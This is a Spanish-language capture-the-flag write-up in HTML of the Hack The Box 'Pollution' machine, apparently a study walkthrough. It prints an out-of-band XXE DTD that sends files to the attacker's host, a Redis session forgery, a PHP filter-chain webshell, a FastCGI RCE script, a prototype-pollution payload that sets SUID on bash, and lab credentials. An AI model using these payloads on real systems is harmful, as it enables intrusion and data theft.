+                <pre><code class="language-http">manage_api=&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;root&gt;&lt;method&gt;POST&lt;/method&gt;&lt;uri&gt;/auth/register&lt;/uri&gt;&lt;user&gt;&lt;username&gt;asd&lt;/username&gt;&lt;password&gt;asd&lt;/password&gt;&lt;/user&gt;&lt;/root&gt;</code></pre>
+
+                <p>Ya que la respuesta solo indica éxito o fracaso, intentaré un ataque de XXE ciego usando una técnica out-of-band de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20OOB%20Attack%20(Yunusov%2C%202013).xml">PayloadsAllTheThings</a>.</p>
+
+                <p>Probando con esta petición:</p>
+
+                <pre><code class="language-http">manage_api=&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://10.10.14.172/evil.dtd"&gt; %xxe;]&gt;</code></pre>
+
+                <p>Y mi archivo <code>evil.dtd</code>:</p>
+
+                <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://10.10.14.172/?x=%file;'&gt;"&gt;
+%eval;</code></pre>
+
+                <p>Recibo un hit en mi servidor HTTP, pero el servidor devuelve un error y no se exfiltran datos.</p>
+
+                <p>Después de probar varios payloads, descubro dos problemas: limitaciones de tamaño de archivo y problemas de formato. Usar <code>/etc/hostname</code> en lugar de <code>/etc/passwd</code> y codificar en base64 resuelve ambos:</p>
+
+                <pre><code class="language-http">manage_api=&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data SYSTEM "http://10.10.14.172/evil.dtd"&gt;&lt;data&gt;&amp;send;&lt;/data&gt;</code></pre>
+
+                <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://10.10.14.172/?xd=%file;'&gt;"&gt;
+%eval;
+%exfil;</code></pre>
+
+                <p>Esto exfiltra exitosamente los datos:</p>
+
+                <pre><code class="language-bash">10.129.228.126 - - "GET /evil.dtd HTTP/1.1" 200 -
+10.129.228.126 - - "GET /?cG9sbHV0aW9uCg== HTTP/1.1" 200 -
+
+echo "cG9sbHV0aW9uCg==" | base64 -d
+pollution</code></pre>
+
+                <p>Para agilizar el proceso, creo un servidor Python en el puerto 5000 que automáticamente decodifica las respuestas base64.</p>
+
+                <h3>Enumeración de Archivos mediante XXE</h3>
+
+                <p>Sabiendo que se usa Apache como reverse proxy, pruebo ubicaciones comunes de archivos de configuración y recupero exitosamente:</p>
+
+                <ul>
+                    <li><code>/etc/apache2/sites-available/000-default.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/collect.htb.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/forum.collect.htb.conf</code></li>
+                    <li><code>/etc/apache2/sites-enabled/developers.collect.htb.conf</code></li>
+                </ul>
+
+                <p>Estos revelan los directorios de la aplicación:</p>
+
+                <ul>
+                    <li><code>/var/www/collect/public</code></li>
+                    <li><code>/var/www/forum/</code></li>
+                    <li><code>/var/www/developers/</code></li>
+                </ul>
+
+                <p>La configuración de developers contiene:</p>
+
+                <pre><code class="language-apache">&lt;Directory "/var/www/developers"&gt;
+    AuthType Basic
+    AuthName "Restricted Content"
+    AuthUserFile /var/www/developers/.htpasswd
+    Require valid-user
+&lt;/Directory&gt;</code></pre>
+
+                <p>Extrayendo <code>/var/www/developers/.htpasswd</code>:</p>
+
+                <pre><code class="language-text">developers_group:$apr1$MzKA5yXY$DwEz.jxW9USWo8.goD7jY1</code></pre>
+
+                <h3>Crackeo de Hash</h3>
+
+                <p>Hashcat identifica esto como Apache MD5 (modo 1600):</p>
+
+                <pre><code class="language-bash">hashcat -m 1600 hash.txt rockyou.txt</code></pre>
+
+                <p>Se crackea exitosamente a: <code>developers_group:r0cket</code></p>
+
+                <h3>Falsificación de Sesión Redis</h3>
+
+                <p>Ahora puedo acceder a <code>developers.collect.htb</code>, pero presenta un panel de login sin credenciales conocidas.</p>
+
+                <p>Examinando <code>/var/www/developers/index.php</code> mediante XXE:</p>
+
+                <pre><code class="language-php">if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
+    die(header('Location: /login.php'));
+}
+
+(...)
+
+&lt;main class="mb-auto mx-24"&gt;
+    &lt;?php include($_GET['page'] . ".php"); ?&gt;
+&lt;/main&gt;</code></pre>
+
+                <p>Esto revela una vulnerabilidad LFI restringida a archivos PHP y una comprobación de sesión para <code>$_SESSION['auth']</code>.</p>
+
+                <p>De <code>/var/www/collect/config.php</code>:</p>
+
+                <pre><code class="language-php">return [
+    "db" => [
+        "host" => "localhost",
+        "dbname" => "webapp",
+        "username" => "webapp_user",
+        "password" => "Str0ngP4ssw0rdB*12@1",
+        "charset" => "utf8"
+    ],
+];</code></pre>
+
+                <p>Y crucialmente, de <code>/var/www/collect/public/bootstrap.php</code>:</p>
+
+                <pre><code class="language-php">&lt;?php
+ini_set('session.save_handler','redis');
+ini_set('session.save_path','tcp://127.0.0.1:6379/?auth=COLLECTR3D1SPASS');</code></pre>
+
+                <p>¡Ahora tengo credenciales de Redis! Conectándome a Redis:</p>
+
+                <pre><code class="language-bash">redis-cli -h collect.htb -p 6379
+collect.htb:6379> AUTH COLLECTR3D1SPASS
+OK</code></pre>
+
+                <p>Puedo ver mi cookie de sesión con <code>scan 0</code>.</p>
+
+                <p>Versión de Redis: 6.0.16</p>
+
+                <p>Intentar escribir una webshell falla:</p>
+
+                <pre><code class="language-bash">config set dir /var/www/html
+config set dbfilename shell.php
+set test "&lt;?php system($_GET['cmd']); ?&gt;"
+save</code></pre>
+
+                <p>Sin embargo, puedo modificar valores de sesión directamente:</p>
+
+                <pre><code class="language-bash">collect.htb:6379> SET PHPREDIS_SESSION:p446kh6utl4343khdja77rnril "auth|b:1;"
+OK</code></pre>
+
+                <p>Esto establece <code>auth=true</code> como un booleano para mi sesión PHP en <code>developers.collect.htb</code>, evitando la comprobación de autenticación.</p>
+
+                <h3>LFI a RCE mediante Cadenas de Filtros PHP</h3>
+
+                <p>Ahora autenticado, puedo explotar el LFI que fuerza extensiones <code>.php</code>. Aunque leer archivos PHP directamente no es útil, puedo usar cadenas de filtros PHP para conseguir RCE: <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p>
+
+                <p>Generando un payload de webshell:</p>
+
+                <pre><code class="language-bash">python3 php_filter_chain_generator.py --chain '&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</code></pre>
+
+                <p>Modificando la URL:</p>
+
+                <pre><code class="language-http">http://developers.collect.htb/?cmd=id&page=php://filter/{chain}</code></pre>
+
+                <p>RCE confirmado:</p>
+
+                <p><img src="./media/image5.png" alt="Confirmación de RCE" /></p>
+
+                <p>Usando la webshell, me envío una reverse shell y gano acceso como <code>www-data</code>.</p>
+
+                <h3>Escalada de Privilegios a Victor</h3>
+
+                <p>En <code>/home</code> y <code>/etc/passwd</code>, encuentro al usuario <code>victor</code>.</p>
+
+                <p>Comprobando puertos abiertos localmente con <code>ss -tuln</code>:</p>
+
+                <pre><code class="language-bash">3000, 9000, 3306</code></pre>
+
+                <p>El puerto 3000 responde con:</p>
+
+                <pre><code class="language-bash">curl localhost:3000
+{"Status":"Ok","Message":"Read documentation from api in /documentation"}</code></pre>
+
+                <p>El puerto 9000 da un error de conexión reseteada, típico de FastCGI.</p>
+
+                <p>Comprobando MySQL con las credenciales que encontré anteriormente revela algunas contraseñas hasheadas, pero ninguna se crackea exitosamente.</p>
+
+                <p>Examinando procesos en ejecución con <code>ps -fauxww</code>, noto PHP-FPM:</p>
+
+                <pre><code class="language-bash">root      970  0.0  1.0 265400 40196 ?        Ss   05:09   0:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)</code></pre>
+
+                <p>El archivo de configuración contiene:</p>
+
+                <pre><code class="language-ini">include=/etc/php/8.1/fpm/pool.d/*.conf</code></pre>
+
+                <p>Buscando referencias de puertos, encuentro que el puerto 9000 está asociado con el usuario <code>victor</code>.</p>
+
+                <h3>Explotación PHP-FPM FastCGI</h3>
+
+                <p>PHP-FPM usa el puerto 9000 para FastCGI. Siguiendo la guía de explotación de <a href="https://book.hacktricks.wiki/en/network-services-pentesting/9000-pentesting-fastcgi.html">HackTricks</a>, encuentro un script para conseguir RCE:</p>
+
+                <pre><code class="language-bash">#!/bin/bash
+
+PAYLOAD="&lt;?php echo '&lt;!--'; system('whoami'); echo '--&gt;';"
+FILENAMES="/var/www/public/index.php" # Existing file path
+
+HOST=$1
+B64=$(echo "$PAYLOAD"|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    env -i \
+      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
+      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
+      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
+
+    cat $OUTPUT
+done</code></pre>
+
+                <p>Modifico el script para usar <code>/var/www/collect/public/index.php</code> como archivo existente y cambio el comando a <code>id</code>:</p>
+
+                <pre><code class="language-bash">./exploit.sh 127.0.0.1</code></pre>
+
+                <p>La salida confirma la ejecución de comandos como <code>victor</code>:</p>
+
+                <pre><code class="language-text">&lt;!--uid=1002(victor) gid=1002(victor) groups=1002(victor)--&gt;</code></pre>
+
+                <p>Ya que bash directa no funciona a través del servidor, uso busybox para una reverse shell, ganando exitosamente acceso como <code>victor</code> y obteniendo la flag de usuario.</p>
+
+                <p>Añado mi clave pública SSH a <code>authorized_keys</code> para persistencia.</p>
+
+                <h3>Escalada de Privilegios a Root mediante Contaminación de Prototipos</h3>
+
+                <p>En el directorio home de victor, hay una carpeta <code>pollution_api</code> que contiene el código fuente de la aplicación ejecutándose en el puerto 3000.</p>
+
+                <p>En <code>functions/jwt.js</code>:</p>
+
+                <pre><code class="language-javascript">const jwt = require('jsonwebtoken');
+const SECRET = "JWT_COLLECT_124_SECRET_KEY"</code></pre>
+
+                <p>El proceso se está ejecutando como root:</p>
+
+                <pre><code class="language-bash">root  1337  0.0  2.0 1680948 81544 ?  Sl  05:09  0:01  \_ /usr/bin/node /root/pollution_api/index.js</code></pre>
+
+                <p>Analizando el código con la extensión Snyk de VSCode revela varias vulnerabilidades de contaminación de prototipos y problemas de inyección de código:</p>
+
+                <p><img src="./media/image6.png" alt="Escaneo de vulnerabilidades Snyk" /></p>
+
+                <p>La función vulnerable <code>merge</code> se usa en <code>Messages_send.js</code>:</p>
+
+                <pre><code class="language-javascript">const messages_send = async(req,res)=>{
+    const token = decodejwt(req.headers['x-access-token'])
+    if(req.body.text){
+
+        const message = {
+            user_sent: token.user,
+            title: "Message for admins",
+        };
+
+        _.merge(message, req.body);
+
+        exec('/home/victor/pollution_api/log.sh log_message');
+(...)</code></pre>
+
+                <p>Para acceder a este endpoint, necesito privilegios de administrador. Actualizo mi rol en la base de datos:</p>
+
+                <pre><code class="language-sql">MariaDB [pollution_api]> update users set role = "admin" where id = 1</code></pre>
+
+                <p>Después de hacer login de nuevo para obtener un nuevo JWT con rol de admin:</p>
+
+                <pre><code class="language-bash">curl localhost:3000/admin/messages/send -X POST -H "x-access-token: {admin_jwt}" -H "Content-Type: application/json" -d '{"text": "asd"}'
+{"Status":"Ok"}</code></pre>
+
+                <h3>Explotación de la Contaminación de Prototipos</h3>
+
+                <p>El objetivo es explotar la contaminación de prototipos para sobrescribir <code>message.__proto__</code>, lo que afecta a todos los objetos JavaScript creados con este prototipo.</p>
+
+                <p>Voy a abusar de la función <code>exec</code> que sigue a la llamada <code>merge</code>. Según la <a href="https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback">documentación de Node.js</a>, <code>exec</code> acepta un objeto de opciones que puede especificar qué shell usar.</p>
+
+                <p>Siguiendo la guía de HackTricks sobre <a href="https://book.hacktricks.wiki/en/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html#pp2rce-vuln-child_process-functions">Contaminación de Prototipos a RCE</a>, encuentro un PoC para <code>exec</code>:</p>
+
+                <pre><code class="language-javascript">const { exec } = require("child_process")
+p = {}
+p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
+p.__proto__.argv0 =
+ "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
+p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
+var proc = exec("something")</code></pre>
+
+                <p>Creando un archivo <code>payload.json</code> para evitar problemas de formato con curl:</p>
+
+                <pre><code class="language-json">{"text": "asd", "__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}</code></pre>
+
+                <p>Ejecutando la petición:</p>
+
+                <pre><code class="language-bash">curl localhost:3000/admin/messages/send -X POST -H "x-access-token: {admin_jwt}" -H "Content-Type: application/json" -d @payload.json</code></pre>
+
+                <p>El archivo aparece en <code>/tmp</code>:</p>
+
+                <pre><code class="language-bash">-rw-r--r--  1 root      root             0 Jan 21 08:57 exec-cmdline</code></pre>
+
+                <p>Modificando el payload para ejecutar <code>chmod u+s /bin/bash</code>:</p>
+
+                <pre><code class="language-json">{"text": "asd", "__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('chmod u+s /bin/bash').toString())//", "NODE_OPTIONS": "--require /proc/self/cmdline"}}</code></pre>
+
+                <p>Después de ejecutar el comando curl, ahora puedo escalar a root:</p>
+
+                <pre><code class="language-bash">bash -p</code></pre>
+
+                <p>¡Acceso a root conseguido y flag del sistema obtenida!</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
